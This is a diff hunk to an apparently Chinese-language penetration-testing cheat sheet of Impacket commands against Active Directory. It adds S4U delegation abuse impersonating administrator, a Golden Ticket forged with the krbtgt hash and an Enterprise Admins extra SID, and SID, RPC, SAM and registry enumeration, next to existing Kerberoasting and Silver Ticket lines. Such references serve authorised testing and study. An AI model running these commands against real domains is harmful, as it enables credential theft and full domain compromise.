@@ -97,8 +97,31 @@ GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request
 getTGT.py DOMAIN/user:password -dc-ip DC_IP
 # 生成 user.ccache → export KRB5CCNAME=user.ccache
 
+# 获取 ST（约束委派 S4U 利用）
+getST.py DOMAIN/svc_account:password -spn cifs/TARGET -impersonate administrator -dc-ip DC_IP
+# -altservice 可替换服务类型
+
 # Silver Ticket
 ticketer.py -nthash SERVICE_NTLM -domain-sid S-1-5-21-... -domain DOMAIN -spn cifs/TARGET user
+
+# Golden Ticket
+ticketer.py -nthash KRBTGT_NTLM -domain-sid S-1-5-21-... -domain DOMAIN -extra-sid S-1-5-21-PARENT-519 user
+```
+
+## 枚举工具
+
+```bash
+# SID 枚举（发现用户/组 RID）
+lookupsid.py DOMAIN/user:password@TARGET
+
+# RPC 枚举（暴露的接口）
+rpcdump.py DOMAIN/user:password@TARGET
+
+# SAM 用户枚举
+samrdump.py DOMAIN/user:password@TARGET
+
+# 远程注册表操作
+reg.py DOMAIN/admin:password@TARGET query -keyName HKLM\\SOFTWARE
 ```
 
 ## NTLM 中继
